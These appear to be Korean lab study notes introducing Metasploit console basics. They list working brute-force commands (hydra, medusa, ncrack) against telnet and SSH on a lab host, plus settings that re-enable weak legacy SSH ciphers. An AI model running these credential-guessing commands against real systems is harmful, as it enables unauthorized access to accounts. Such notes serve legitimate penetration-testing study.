
## Metasploit Framework

Metasploit Framework란?

침투 테스트(펜테스트)용 오픈소스 프레임워크<br/>
다양한 취약점 공격 모듈, 페이로드, 후속 조치(post) 도구를 제공<br/>
공격 자동화, 취약점 탐지, 시스템 제어, 리버스 셸 생성 등을 실습 가능<br/>
Kali Linux에 기본 탑재되어 있음<br/>


모듈 검색: search ssh<br/>
모듈 사용: use exploit/multi/ssh/sshexec<br/>
옵션 설정: set RHOSTS 192.168.0.1   → show options<br/>
공격 실행: run 또는 exploit<br/>
종료: quit<br/>
돌아오기 : back<br/>

<img width="623" height="286" alt="image" src="https://github.com/user-attachments/assets/83cfd5c5-fb4d-4a88-b5fe-0abeb1ed0b83" />


──(root㉿kali)-[~]<br/>
└─# nano /etc/ssh/ssh_config<br/>
KexAlgorithms +diffie-hellman-group1-sha1 <br/>
HostKeyAlgorithms +ssh-rsa <br/>
Ciphers aes128-cbc,3des-cbc,aes192-cbc,aes256-cbc,aes128-ctr,aes192-ctr,aes256-ctr <br/>

└─# hydra -l ccnp -P passwords.txt telnet://1.1.13.3 -V -f<br/>
hydra -L usernames.txt -P passwords.txt telnet://1.1.13.3 -V -f<br/>

──(root㉿kali)-[~]<br/>
└─# medusa -h 1.1.13.3 -u ccnp -P passwords.txt -M ssh -v 6 -f<br/>

┌──(root㉿kali)-[~]<br/>
└─# medusa -h 1.1.13.3 -U usernames.txt -P passwords.txt -M telnet -v 6 -f <br/>


┌──(root㉿kali)-[~]<br/>
└─# ncrack -p 23 -U usernames.txt -P passwords.txt 1.1.13.3 -v -f<br/>


























































































































































































































